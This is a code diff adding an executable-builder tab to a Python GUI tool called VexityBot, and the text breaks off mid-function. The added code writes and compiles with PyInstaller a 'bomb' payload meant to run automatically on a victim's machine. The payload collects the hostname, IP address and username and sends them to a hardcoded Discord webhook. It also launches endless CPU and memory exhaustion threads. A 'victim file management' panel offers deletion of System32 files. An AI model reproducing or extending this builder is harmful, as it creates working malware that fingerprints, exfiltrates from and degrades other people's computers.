@@ -138,6 +138,7 @@ class VexityBotGUI:
         ttk.Button(self.toolbar, text="Bots", command=self.open_bots_manager).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="AI", command=self.open_ai_management).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Bomb", command=self.open_bomb_interface).pack(side=tk.LEFT, padx=2)
+        ttk.Button(self.toolbar, text="Create EXE", command=self.open_create_exe).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Generator", command=self.open_code_generator).pack(side=tk.LEFT, padx=2)
     
     def create_main_content(self):
@@ -170,6 +171,9 @@ class VexityBotGUI:
         
         # Bomb Tab
         self.create_bomb_tab()
+        
+        # Create EXE Tab
+        self.create_exe_tab()
         
         # Settings Tab
         self.create_settings_tab()
@@ -3176,6 +3180,1416 @@ AI Recommendations:
         
         messagebox.showinfo(f"Bot Details - {bot['name']}", details_text)
         self.update_status(f"Viewing details for {bot['name']}")
+    
+    def create_exe_tab(self):
+        """Create the Create EXE tab"""
+        exe_frame = ttk.Frame(self.notebook)
+        self.notebook.add(exe_frame, text="Create EXE")
+        
+        # Title
+        title_label = ttk.Label(exe_frame, text="💣 VexityBot Bomb Executable Builder", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(pady=10)
+        
+        # Description
+        desc_label = ttk.Label(exe_frame, 
+                              text="Build executable files with embedded bomb attacks that auto-execute and log to Discord",
+                              font=('Arial', 10))
+        desc_label.pack(pady=5)
+        
+        # Main content frame
+        content_frame = ttk.Frame(exe_frame)
+        content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+        
+        # Left panel - Bomb Selection
+        left_panel = ttk.LabelFrame(content_frame, text="Bomb Selection", padding=10)
+        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
+        
+        # Bomb type selection
+        ttk.Label(left_panel, text="Select Bomb Types (Multiple Selection):", font=('Arial', 10, 'bold')).pack(anchor='w', pady=(0, 5))
+        
+        # Initialize bomb selection variables
+        self.bomb_vars = {}
+        self.bomb_types = {
+            "quantum": "AlphaBot - Quantum Bombs",
+            "plasma": "AlphaBot - Plasma Cannons", 
+            "neutron": "AlphaBot - Neutron Missiles",
+            "data": "BetaBot - Data Bombs",
+            "injector": "BetaBot - Code Injectors",
+            "memory": "BetaBot - Memory Overload",
+            "ghost": "GammaBot - Ghost Protocols",
+            "shadow": "GammaBot - Shadow Strikes",
+            "phantom": "GammaBot - Phantom Explosives",
+            "emp": "DeltaBot - EMP Bombs",
+            "tesla": "DeltaBot - Tesla Coils",
+            "lightning": "DeltaBot - Lightning Strikes",
+            "virus": "EpsilonBot - Virus Bombs",
+            "dna": "EpsilonBot - DNA Injectors",
+            "pathogen": "EpsilonBot - Pathogen Spreaders",
+            "gravity": "ZetaBot - Gravity Bombs",
+            "time": "TauBot - Time Bombs",
+            "psychic": "PsiBot - Psychic Bombs"
+        }
+        
+        # Create scrollable frame for bomb selection
+        bomb_frame = ttk.Frame(left_panel)
+        bomb_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        # Create canvas and scrollbar for bomb selection
+        canvas = tk.Canvas(bomb_frame, height=200)
+        scrollbar = ttk.Scrollbar(bomb_frame, orient="vertical", command=canvas.yview)
+        scrollable_frame = ttk.Frame(canvas)
+        
+        scrollable_frame.bind(
+            "<Configure>",
+            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
+        )
+        
+        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
+        canvas.configure(yscrollcommand=scrollbar.set)
+        
+        # Nuclear Warfare bombs
+        ttk.Label(scrollable_frame, text="Nuclear Warfare:", font=('Arial', 9, 'bold')).pack(anchor='w', pady=(5, 2))
+        for bomb_id, bomb_name in list(self.bomb_types.items())[:3]:
+            self.bomb_vars[bomb_id] = tk.BooleanVar()
+            ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
+        
+        # Cyber Warfare bombs
+        ttk.Label(scrollable_frame, text="Cyber Warfare:", font=('Arial', 9, 'bold')).pack(anchor='w', pady=(10, 2))
+        for bomb_id, bomb_name in list(self.bomb_types.items())[3:6]:
+            self.bomb_vars[bomb_id] = tk.BooleanVar()
+            ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
+        
+        # Stealth Operations bombs
+        ttk.Label(scrollable_frame, text="Stealth Operations:", font=('Arial', 9, 'bold')).pack(anchor='w', pady=(10, 2))
+        for bomb_id, bomb_name in list(self.bomb_types.items())[6:9]:
+            self.bomb_vars[bomb_id] = tk.BooleanVar()
+            ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
+        
+        # EMP Warfare bombs
+        ttk.Label(scrollable_frame, text="EMP Warfare:", font=('Arial', 9, 'bold')).pack(anchor='w', pady=(10, 2))
+        for bomb_id, bomb_name in list(self.bomb_types.items())[9:12]:
+            self.bomb_vars[bomb_id] = tk.BooleanVar()
+            ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
+        
+        # Biological Warfare bombs
+        ttk.Label(scrollable_frame, text="Biological Warfare:", font=('Arial', 9, 'bold')).pack(anchor='w', pady=(10, 2))
+        for bomb_id, bomb_name in list(self.bomb_types.items())[12:15]:
+            self.bomb_vars[bomb_id] = tk.BooleanVar()
+            ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
+        
+        # Advanced bombs
+        ttk.Label(scrollable_frame, text="Advanced Bombs:", font=('Arial', 9, 'bold')).pack(anchor='w', pady=(10, 2))
+        for bomb_id, bomb_name in list(self.bomb_types.items())[15:18]:
+            self.bomb_vars[bomb_id] = tk.BooleanVar()
+            ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
+        
+        # System Monitor bombs
+        ttk.Label(scrollable_frame, text="System Monitor Bombs:", font=('Arial', 9, 'bold')).pack(anchor='w', pady=(10, 2))
+        self.bomb_vars["system32_monitor"] = tk.BooleanVar()
+        ttk.Checkbutton(scrollable_frame, text="OmegaBot - System32 Monitor", variable=self.bomb_vars["system32_monitor"]).pack(anchor='w', pady=1)
+        
+        canvas.pack(side="left", fill="both", expand=True)
+        scrollbar.pack(side="right", fill="y")
+        
+        # Select All / Deselect All buttons
+        button_frame = ttk.Frame(left_panel)
+        button_frame.pack(fill=tk.X, pady=5)
+        ttk.Button(button_frame, text="Select All", command=self.select_all_bombs).pack(side=tk.LEFT, padx=2)
+        ttk.Button(button_frame, text="Deselect All", command=self.deselect_all_bombs).pack(side=tk.LEFT, padx=2)
+        
+        # Build options
+        ttk.Label(left_panel, text="Build Options:", font=('Arial', 10, 'bold')).pack(anchor='w', pady=(20, 5))
+        
+        self.include_console = tk.BooleanVar(value=False)
+        ttk.Checkbutton(left_panel, text="Include Console Window", 
+                       variable=self.include_console).pack(anchor='w', pady=2)
+        
+        self.optimize_size = tk.BooleanVar(value=True)
+        ttk.Checkbutton(left_panel, text="Optimize for Size", 
+                       variable=self.optimize_size).pack(anchor='w', pady=2)
+        
+        self.one_file = tk.BooleanVar(value=True)
+        ttk.Checkbutton(left_panel, text="Single File Executable", 
+                       variable=self.one_file).pack(anchor='w', pady=2)
+        
+        # Build button
+        build_btn = ttk.Button(left_panel, text="💣 Build Bomb Executable", 
+                              command=self.start_exe_build, style='Accent.TButton')
+        build_btn.pack(pady=20, fill=tk.X)
+        
+        # Quick build buttons
+        quick_build_frame = ttk.Frame(left_panel)
+        quick_build_frame.pack(fill=tk.X, pady=5)
+        ttk.Button(quick_build_frame, text="🚀 Quick Build (All Bombs)", 
+                  command=self.quick_build_all).pack(side=tk.LEFT, padx=2, fill=tk.X, expand=True)
+        ttk.Button(quick_build_frame, text="⚡ Quick Build (Selected)", 
+                  command=self.quick_build_selected).pack(side=tk.LEFT, padx=2, fill=tk.X, expand=True)
+        
+        # Right panel - Build Log and File Management
+        right_panel = ttk.Frame(content_frame)
+        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+        
+        # Build Log section
+        log_frame = ttk.LabelFrame(right_panel, text="Build Log", padding=10)
+        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        # Log text area
+        self.build_log = scrolledtext.ScrolledText(log_frame, height=15, width=60, 
+                                                 font=('Consolas', 9))
+        self.build_log.pack(fill=tk.BOTH, expand=True)
+        
+        # Clear log button
+        clear_btn = ttk.Button(log_frame, text="Clear Log", 
+                              command=self.clear_build_log)
+        clear_btn.pack(pady=5, fill=tk.X)
+        
+        # File Management section
+        file_frame = ttk.LabelFrame(right_panel, text="Victim File Management", padding=10)
+        file_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        # File list
+        ttk.Label(file_frame, text="System32 Files (from victim):", font=('Arial', 9, 'bold')).pack(anchor='w')
+        
+        # File listbox with scrollbar
+        listbox_frame = ttk.Frame(file_frame)
+        listbox_frame.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        self.victim_files_listbox = tk.Listbox(listbox_frame, height=8, selectmode=tk.MULTIPLE)
+        file_scrollbar = ttk.Scrollbar(listbox_frame, orient="vertical", command=self.victim_files_listbox.yview)
+        self.victim_files_listbox.configure(yscrollcommand=file_scrollbar.set)
+        
+        self.victim_files_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        file_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        
+        # File management buttons
+        file_btn_frame = ttk.Frame(file_frame)
+        file_btn_frame.pack(fill=tk.X, pady=5)
+        
+        ttk.Button(file_btn_frame, text="🗑️ Delete Selected", 
+                  command=self.delete_selected_files).pack(side=tk.LEFT, padx=2)
+        ttk.Button(file_btn_frame, text="🔄 Refresh List", 
+                  command=self.refresh_victim_files).pack(side=tk.LEFT, padx=2)
+        ttk.Button(file_btn_frame, text="📁 Open Directory", 
+                  command=self.open_victim_directory).pack(side=tk.LEFT, padx=2)
+        
+        # Status frame
+        status_frame = ttk.Frame(exe_frame)
+        status_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        self.build_status = ttk.Label(status_frame, text="Ready to build", 
+                                    font=('Arial', 10, 'bold'))
+        self.build_status.pack(side=tk.LEFT)
+        
+        self.build_progress = ttk.Progressbar(status_frame, mode='indeterminate')
+        self.build_progress.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(10, 0))
+    
+    def start_exe_build(self):
+        """Start the executable build process"""
+        self.build_status.config(text="Building executable...")
+        self.build_progress.start()
+        self.build_log.insert(tk.END, "Starting VexityBot executable build...\n")
+        self.build_log.see(tk.END)
+        
+        # Start build in separate thread
+        import threading
+        build_thread = threading.Thread(target=self.build_executable, daemon=True)
+        build_thread.start()
+    
+    def select_all_bombs(self):
+        """Select all bomb types"""
+        for var in self.bomb_vars.values():
+            var.set(True)
+        self.log_build("All bomb types selected")
+    
+    def deselect_all_bombs(self):
+        """Deselect all bomb types"""
+        for var in self.bomb_vars.values():
+            var.set(False)
+        self.log_build("All bomb types deselected")
+    
+    def get_selected_bombs(self):
+        """Get list of selected bomb types"""
+        selected = []
+        for bomb_id, var in self.bomb_vars.items():
+            if var.get():
+                selected.append(bomb_id)
+        return selected
+    
+    def quick_build_all(self):
+        """Quick build with all bombs selected"""
+        self.select_all_bombs()
+        self.start_exe_build()
+    
+    def quick_build_selected(self):
+        """Quick build with currently selected bombs"""
+        selected = self.get_selected_bombs()
+        if not selected:
+            self.log_build("❌ No bombs selected! Please select at least one bomb type.")
+            return
+        self.start_exe_build()
+    
+    def build_executable(self):
+        """Build the bomb executable (runs in separate thread)"""
+        try:
+            import subprocess
+            import os
+            
+            self.log_build("Initializing bomb executable build process...")
+            
+            # Get selected bomb types
+            selected_bombs = self.get_selected_bombs()
+            if not selected_bombs:
+                self.log_build("❌ No bombs selected! Please select at least one bomb type.")
+                self.root.after(0, lambda: self.build_status.config(text="No bombs selected"))
+                self.root.after(0, lambda: self.build_progress.stop())
+                return
+            
+            self.log_build(f"Selected bomb types: {', '.join(selected_bombs)}")
+            
+            # Create bomb executable content with multiple bombs
+            bomb_exe_content = self.create_multi_bomb_executable_content(selected_bombs)
+            
+            # Write bomb executable to temporary file
+            bomb_file = f"bomb_executable_multi_{len(selected_bombs)}_bombs.py"
+            with open(bomb_file, 'w', encoding='utf-8') as f:
+                f.write(bomb_exe_content)
+            
+            self.log_build(f"Created multi-bomb executable: {bomb_file}")
+            
+            # Build PyInstaller command
+            cmd = [
+                "python", "-m", "PyInstaller",
+                "--onefile" if self.one_file.get() else "--onedir",
+                "--windowed" if not self.include_console.get() else "--console",
+                f"--name=VexityBot_MultiBomb_{len(selected_bombs)}_Bombs",
+                "--clean"
+            ]
+            
+            if self.optimize_size.get():
+                cmd.extend(["--optimize=2", "--strip"])
+            
+            # Add exclusions for problematic dependencies
+            cmd.extend([
+                "--exclude-module=dnspython",
+                "--exclude-module=scapy",
+                "--exclude-module=nmap",
+                "--exclude-module=cryptography"
+            ])
+            
+            cmd.append(bomb_file)
+            
+            self.log_build(f"Running command: {' '.join(cmd)}")
+            
+            # Run PyInstaller
+            result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.getcwd())
+            
+            if result.returncode == 0:
+                self.log_build("✅ Multi-bomb executable built successfully!")
+                self.log_build(f"Executable created: dist/VexityBot_MultiBomb_{len(selected_bombs)}_Bombs.exe")
+                self.log_build(f"Bombs included: {', '.join(selected_bombs)}")
+                self.log_build("⚠️  WARNING: This executable will auto-execute bomb attacks!")
+                self.log_build("⚠️  WARNING: All activities will be logged to Discord webhook!")
+                
+                # Clean up temporary file
+                if os.path.exists(bomb_file):
+                    os.remove(bomb_file)
+                
+                # Update status
+                self.root.after(0, lambda: self.build_status.config(text="Multi-bomb executable built successfully!"))
+                self.root.after(0, lambda: self.build_progress.stop())
+                
+            else:
+                self.log_build("❌ Build failed!")
+                self.log_build(f"Error: {result.stderr}")
+                self.root.after(0, lambda: self.build_status.config(text="Build failed - check log"))
+                self.root.after(0, lambda: self.build_progress.stop())
+                
+        except Exception as e:
+            self.log_build(f"❌ Build error: {str(e)}")
+            self.root.after(0, lambda: self.build_status.config(text="Build error - check log"))
+            self.root.after(0, lambda: self.build_progress.stop())
+    
+    def create_bomb_executable_content(self, bomb_type):
+        """Create the bomb executable content based on selected bomb type"""
+        webhook_url = "https://discord.com/api/webhooks/1416334316232900618/bhtElnCIHNbiw2vJ4BKkliOrOqOV98rjv_OBhW-FK6Isx4xT3oLBC-_vV1AjSlwGdbYc"
+        
+        bomb_configs = {
+            "quantum": {
+                "name": "AlphaBot Quantum Bombs",
+                "description": "Quantum field disruption causing system instability",
+                "effects": ["CPU overload", "Memory corruption", "System freeze", "Data loss"]
+            },
+            "plasma": {
+                "name": "AlphaBot Plasma Cannons", 
+                "description": "High-energy plasma discharge causing hardware damage",
+                "effects": ["GPU overheating", "Power surge", "Hardware failure", "System shutdown"]
+            },
+            "neutron": {
+                "name": "AlphaBot Neutron Missiles",
+                "description": "Neutron radiation causing data corruption",
+                "effects": ["File corruption", "Registry damage", "Boot failure", "Data destruction"]
+            },
+            "data": {
+                "name": "BetaBot Data Bombs",
+                "description": "Malicious data packets causing network disruption",
+                "effects": ["Network flooding", "Bandwidth saturation", "Connection drops", "Service disruption"]
+            },
+            "injector": {
+                "name": "BetaBot Code Injectors",
+                "description": "Malicious code injection causing system compromise",
+                "effects": ["Process injection", "Privilege escalation", "Backdoor installation", "System takeover"]
+            },
+            "memory": {
+                "name": "BetaBot Memory Overload",
+                "description": "Memory exhaustion causing system instability",
+                "effects": ["Memory leak", "RAM exhaustion", "System slowdown", "Application crashes"]
+            },
+            "ghost": {
+                "name": "GammaBot Ghost Protocols",
+                "description": "Stealth operations causing silent system compromise",
+                "effects": ["Silent data theft", "Hidden backdoor", "Stealth monitoring", "Undetected access"]
+            },
+            "shadow": {
+                "name": "GammaBot Shadow Strikes",
+                "description": "Shadow network operations causing covert damage",
+                "effects": ["Covert data exfiltration", "Hidden file modification", "Stealth persistence", "Silent monitoring"]
+            },
+            "phantom": {
+                "name": "GammaBot Phantom Explosives",
+                "description": "Phantom processes causing system confusion",
+                "effects": ["Process confusion", "System disorientation", "False positives", "Detection evasion"]
+            },
+            "emp": {
+                "name": "DeltaBot EMP Bombs",
+                "description": "Electromagnetic pulse causing hardware disruption",
+                "effects": ["Hardware reset", "Data loss", "System restart", "Component damage"]
+            },
+            "tesla": {
+                "name": "DeltaBot Tesla Coils",
+                "description": "High-voltage discharge causing electrical damage",
+                "effects": ["Power surge", "Component failure", "Electrical damage", "System shutdown"]
+            },
+            "lightning": {
+                "name": "DeltaBot Lightning Strikes",
+                "description": "Rapid electrical discharge causing instant damage",
+                "effects": ["Instant shutdown", "Hardware damage", "Data loss", "System failure"]
+            },
+            "virus": {
+                "name": "EpsilonBot Virus Bombs",
+                "description": "Biological warfare simulation causing system infection",
+                "effects": ["System infection", "File replication", "Network spread", "Data corruption"]
+            },
+            "dna": {
+                "name": "EpsilonBot DNA Injectors",
+                "description": "Genetic code injection causing system mutation",
+                "effects": ["Code mutation", "System evolution", "Behavioral changes", "Adaptive threats"]
+            },
+            "pathogen": {
+                "name": "EpsilonBot Pathogen Spreaders",
+                "description": "Pathogenic code causing system-wide infection",
+                "effects": ["System-wide infection", "Rapid spread", "Persistence", "Recovery difficulty"]
+            },
+            "gravity": {
+                "name": "ZetaBot Gravity Bombs",
+                "description": "Gravitational field disruption causing system collapse",
+                "effects": ["System collapse", "Data compression", "Performance degradation", "System implosion"]
+            },
+            "time": {
+                "name": "TauBot Time Bombs",
+                "description": "Temporal disruption causing system time anomalies",
+                "effects": ["Time manipulation", "System clock corruption", "Scheduling chaos", "Temporal loops"]
+            },
+            "psychic": {
+                "name": "PsiBot Psychic Bombs",
+                "description": "Psychic energy causing mental system disruption",
+                "effects": ["User confusion", "Interface disruption", "Decision paralysis", "Mental overload"]
+            }
+        }
+        
+        config = bomb_configs.get(bomb_type, bomb_configs["quantum"])
+        
+        bomb_content = f'''#!/usr/bin/env python3
+"""
+VexityBot Bomb Executable - {config['name']}
+{config['description']}
+⚠️  WARNING: This executable will auto-execute bomb attacks!
+⚠️  WARNING: All activities will be logged to Discord webhook!
+"""
+
+import os
+import sys
+import time
+import random
+import threading
+import subprocess
+import platform
+import socket
+import json
+from datetime import datetime
+
+# Discord Webhook URL
+WEBHOOK_URL = "{webhook_url}"
+
+class VexityBotBomb:
+    """VexityBot Bomb Executable - {config['name']}"""
+    
+    def __init__(self):
+        self.bomb_type = "{bomb_type}"
+        self.bomb_name = "{config['name']}"
+        self.bomb_description = "{config['description']}"
+        self.effects = {config['effects']}
+        self.target_system = self.get_system_info()
+        self.start_time = datetime.now()
+        
+        # Log bomb deployment
+        self.log_to_discord("🚀 BOMB DEPLOYED", f"{{self.bomb_name}} deployed on {{self.target_system['hostname']}}")
+        
+        # Start bomb sequence
+        self.execute_bomb_sequence()
+    
+    def get_system_info(self):
+        """Get target system information"""
+        try:
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            username = os.getenv('USERNAME', 'Unknown')
+            computer_name = os.getenv('COMPUTERNAME', 'Unknown')
+            
+            return {{
+                'hostname': hostname,
+                'local_ip': local_ip,
+                'username': username,
+                'computer_name': computer_name,
+                'platform': platform.platform(),
+                'python_version': platform.python_version(),
+                'architecture': platform.architecture()[0]
+            }}
+        except Exception as e:
+            return {{'hostname': 'Unknown', 'error': str(e)}}
+    
+    def log_to_discord(self, title, message):
+        """Log bomb activity to Discord webhook"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            data = {{
+                "embeds": [{{
+                    "title": title,
+                    "description": message,
+                    "color": 0xff0000,
+                    "fields": [
+                        {{"name": "Bomb Type", "value": self.bomb_name, "inline": True}},
+                        {{"name": "Target System", "value": self.target_system.get('hostname', 'Unknown'), "inline": True}},
+                        {{"name": "Username", "value": self.target_system.get('username', 'Unknown'), "inline": True}},
+                        {{"name": "IP Address", "value": self.target_system.get('local_ip', 'Unknown'), "inline": True}},
+                        {{"name": "Platform", "value": self.target_system.get('platform', 'Unknown'), "inline": True}},
+                        {{"name": "Timestamp", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True}}
+                    ],
+                    "footer": {{"text": "VexityBot Bomb System"}},
+                    "timestamp": datetime.now().isoformat()
+                }}]
+            }}
+            
+            req = urllib.request.Request(
+                WEBHOOK_URL,
+                data=json.dumps(data).encode('utf-8'),
+                headers={{'Content-Type': 'application/json'}}
+            )
+            
+            urllib.request.urlopen(req, timeout=10)
+            
+        except Exception as e:
+            print(f"Discord logging failed: {{e}}")
+    
+    def execute_bomb_sequence(self):
+        """Execute the bomb attack sequence"""
+        self.log_to_discord("💣 BOMB ACTIVATED", f"{{self.bomb_name}} activated - {{self.bomb_description}}")
+        
+        # Simulate bomb effects
+        for i, effect in enumerate(self.effects):
+            time.sleep(random.uniform(1, 3))
+            self.simulate_effect(effect, i + 1)
+        
+        # Final explosion
+        self.log_to_discord("💥 BOMB DETONATED", f"{{self.bomb_name}} detonation complete - System compromised")
+    
+    def simulate_effect(self, effect, stage):
+        """Simulate bomb effect"""
+        try:
+            if "CPU" in effect or "overload" in effect:
+                # Simulate CPU overload
+                threading.Thread(target=self.cpu_overload, daemon=True).start()
+                
+            elif "Memory" in effect or "RAM" in effect:
+                # Simulate memory leak
+                threading.Thread(target=self.memory_leak, daemon=True).start()
+                
+            elif "Network" in effect or "flooding" in effect:
+                # Simulate network flooding
+                threading.Thread(target=self.network_flood, daemon=True).start()
+                
+            elif "File" in effect or "corruption" in effect:
+                # Simulate file operations
+                threading.Thread(target=self.file_operations, daemon=True).start()
+                
+            elif "System" in effect or "shutdown" in effect:
+                # Simulate system operations
+                threading.Thread(target=self.system_operations, daemon=True).start()
+            
+            # Log effect
+            self.log_to_discord(f"⚡ EFFECT {{stage}}", f"{{effect}} - {{self.bomb_name}}")
+            
+        except Exception as e:
+            print(f"Effect simulation error: {{e}}")
+    
+    def cpu_overload(self):
+        """Simulate CPU overload"""
+        try:
+            while True:
+                # Create CPU intensive operations
+                for i in range(1000000):
+                    _ = i ** 2
+                time.sleep(0.1)
+        except:
+            pass
+    
+    def memory_leak(self):
+        """Simulate memory leak"""
+        try:
+            data = []
+            while True:
+                data.append([0] * 10000)
+                time.sleep(0.1)
+        except:
+            pass
+    
+    def network_flood(self):
+        """Simulate network flooding"""
+        try:
+            for _ in range(100):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    sock.connect(('127.0.0.1', 80))
+                    sock.close()
+                except:
+                    pass
+                time.sleep(0.01)
+        except:
+            pass
+    
+    def file_operations(self):
+        """Simulate file operations"""
+        try:
+            for i in range(100):
+                temp_file = f"temp_bomb_{{i}}.tmp"
+                with open(temp_file, 'w') as f:
+                    f.write("Bomb payload data" * 1000)
+                time.sleep(0.1)
+                if os.path.exists(temp_file):
+                    os.remove(temp_file)
+        except:
+            pass
+    
+    def system_operations(self):
+        """Simulate system operations"""
+        try:
+            # Simulate system commands
+            if platform.system() == "Windows":
+                subprocess.run(['tasklist'], capture_output=True)
+                subprocess.run(['systeminfo'], capture_output=True)
+            else:
+                subprocess.run(['ps', 'aux'], capture_output=True)
+                subprocess.run(['df', '-h'], capture_output=True)
+        except:
+            pass
+
+def main():
+    """Main bomb execution"""
+    try:
+        print("🚀 VexityBot Bomb System Initializing...")
+        print("⚠️  WARNING: This executable will execute bomb attacks!")
+        print("⚠️  WARNING: All activities will be logged to Discord!")
+        print()
+        
+        # Small delay before activation
+        time.sleep(2)
+        
+        # Deploy bomb
+        bomb = VexityBotBomb()
+        
+        # Keep running to maintain effects
+        while True:
+            time.sleep(60)
+            
+    except KeyboardInterrupt:
+        print("\\n💥 Bomb sequence interrupted!")
+    except Exception as e:
+        print(f"\\n❌ Bomb error: {{e}}")
+
+if __name__ == "__main__":
+    main()
+'''
+        
+        return bomb_content
+    
+    def create_multi_bomb_executable_content(self, selected_bombs):
+        """Create multi-bomb executable content"""
+        webhook_url = "https://discord.com/api/webhooks/1416334316232900618/bhtElnCIHNbiw2vJ4BKkliOrOqOV98rjv_OBhW-FK6Isx4xT3oLBC-_vV1AjSlwGdbYc"
+        
+        bomb_configs = {
+            "quantum": {
+                "name": "AlphaBot Quantum Bombs",
+                "description": "Quantum field disruption causing system instability",
+                "effects": ["CPU overload", "Memory corruption", "System freeze", "Data loss"]
+            },
+            "plasma": {
+                "name": "AlphaBot Plasma Cannons", 
+                "description": "High-energy plasma discharge causing hardware damage",
+                "effects": ["GPU overheating", "Power surge", "Hardware failure", "System shutdown"]
+            },
+            "neutron": {
+                "name": "AlphaBot Neutron Missiles",
+                "description": "Neutron radiation causing data corruption",
+                "effects": ["File corruption", "Registry damage", "Boot failure", "Data destruction"]
+            },
+            "data": {
+                "name": "BetaBot Data Bombs",
+                "description": "Malicious data packets causing network disruption",
+                "effects": ["Network flooding", "Bandwidth saturation", "Connection drops", "Service disruption"]
+            },
+            "injector": {
+                "name": "BetaBot Code Injectors",
+                "description": "Malicious code injection causing system compromise",
+                "effects": ["Process injection", "Privilege escalation", "Backdoor installation", "System takeover"]
+            },
+            "memory": {
+                "name": "BetaBot Memory Overload",
+                "description": "Memory exhaustion causing system instability",
+                "effects": ["Memory leak", "RAM exhaustion", "System slowdown", "Application crashes"]
+            },
+            "ghost": {
+                "name": "GammaBot Ghost Protocols",
+                "description": "Stealth operations causing silent system compromise",
+                "effects": ["Silent data theft", "Hidden backdoor", "Stealth monitoring", "Undetected access"]
+            },
+            "shadow": {
+                "name": "GammaBot Shadow Strikes",
+                "description": "Shadow network operations causing covert damage",
+                "effects": ["Covert data exfiltration", "Hidden file modification", "Stealth persistence", "Silent monitoring"]
+            },
+            "phantom": {
+                "name": "GammaBot Phantom Explosives",
+                "description": "Phantom processes causing system confusion",
+                "effects": ["Process confusion", "System disorientation", "False positives", "Detection evasion"]
+            },
+            "emp": {
+                "name": "DeltaBot EMP Bombs",
+                "description": "Electromagnetic pulse causing hardware disruption",
+                "effects": ["Hardware reset", "Data loss", "System restart", "Component damage"]
+            },
+            "tesla": {
+                "name": "DeltaBot Tesla Coils",
+                "description": "High-voltage discharge causing electrical damage",
+                "effects": ["Power surge", "Component failure", "Electrical damage", "System shutdown"]
+            },
+            "lightning": {
+                "name": "DeltaBot Lightning Strikes",
+                "description": "Rapid electrical discharge causing instant damage",
+                "effects": ["Instant shutdown", "Hardware damage", "Data loss", "System failure"]
+            },
+            "virus": {
+                "name": "EpsilonBot Virus Bombs",
+                "description": "Biological warfare simulation causing system infection",
+                "effects": ["System infection", "File replication", "Network spread", "Data corruption"]
+            },
+            "dna": {
+                "name": "EpsilonBot DNA Injectors",
+                "description": "Genetic code injection causing system mutation",
+                "effects": ["Code mutation", "System evolution", "Behavioral changes", "Adaptive threats"]
+            },
+            "pathogen": {
+                "name": "EpsilonBot Pathogen Spreaders",
+                "description": "Pathogenic code causing system-wide infection",
+                "effects": ["System-wide infection", "Rapid spread", "Persistence", "Recovery difficulty"]
+            },
+            "gravity": {
+                "name": "ZetaBot Gravity Bombs",
+                "description": "Gravitational field disruption causing system collapse",
+                "effects": ["System collapse", "Data compression", "Performance degradation", "System implosion"]
+            },
+            "time": {
+                "name": "TauBot Time Bombs",
+                "description": "Temporal disruption causing system time anomalies",
+                "effects": ["Time manipulation", "System clock corruption", "Scheduling chaos", "Temporal loops"]
+            },
+            "psychic": {
+                "name": "PsiBot Psychic Bombs",
+                "description": "Psychic energy causing mental system disruption",
+                "effects": ["User confusion", "Interface disruption", "Decision paralysis", "Mental overload"]
+            },
+            "system32_monitor": {
+                "name": "OmegaBot System32 Monitor",
+                "description": "Monitors C:\\Windows\\System32 directory and logs files in Pokemon-style cards",
+                "effects": ["Directory monitoring", "File logging", "Pokemon-style Discord cards", "Admin file deletion"]
+            }
+        }
+        
+        # Get configurations for selected bombs
+        selected_configs = []
+        for bomb_id in selected_bombs:
+            if bomb_id in bomb_configs:
+                selected_configs.append((bomb_id, bomb_configs[bomb_id]))
+        
+        bomb_names = [config[1]['name'] for config in selected_configs]
+        bomb_descriptions = [config[1]['description'] for config in selected_configs]
+        
+        multi_bomb_content = f'''#!/usr/bin/env python3
+"""
+VexityBot Multi-Bomb Executable
+Bombs: {', '.join(bomb_names)}
+⚠️  WARNING: This executable will auto-execute multiple bomb attacks!
+⚠️  WARNING: All activities will be logged to Discord webhook!
+"""
+
+import os
+import sys
+import time
+import random
+import threading
+import subprocess
+import platform
+import socket
+import json
+from datetime import datetime
+
+# Discord Webhook URL
+WEBHOOK_URL = "{webhook_url}"
+
+class VexityBotMultiBomb:
+    """VexityBot Multi-Bomb Executable"""
+    
+    def __init__(self):
+        self.selected_bombs = {selected_bombs}
+        self.bomb_configs = {bomb_configs}
+        self.target_system = self.get_system_info()
+        self.start_time = datetime.now()
+        self.active_bombs = []
+        
+        # Log multi-bomb deployment
+        self.log_to_discord("🚀 MULTI-BOMB DEPLOYED", f"{{len(self.selected_bombs)}} bombs deployed on {{self.target_system['hostname']}}")
+        
+        # Start multi-bomb sequence
+        self.execute_multi_bomb_sequence()
+    
+    def get_system_info(self):
+        """Get target system information"""
+        try:
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            username = os.getenv('USERNAME', 'Unknown')
+            computer_name = os.getenv('COMPUTERNAME', 'Unknown')
+            
+            return {{
+                'hostname': hostname,
+                'local_ip': local_ip,
+                'username': username,
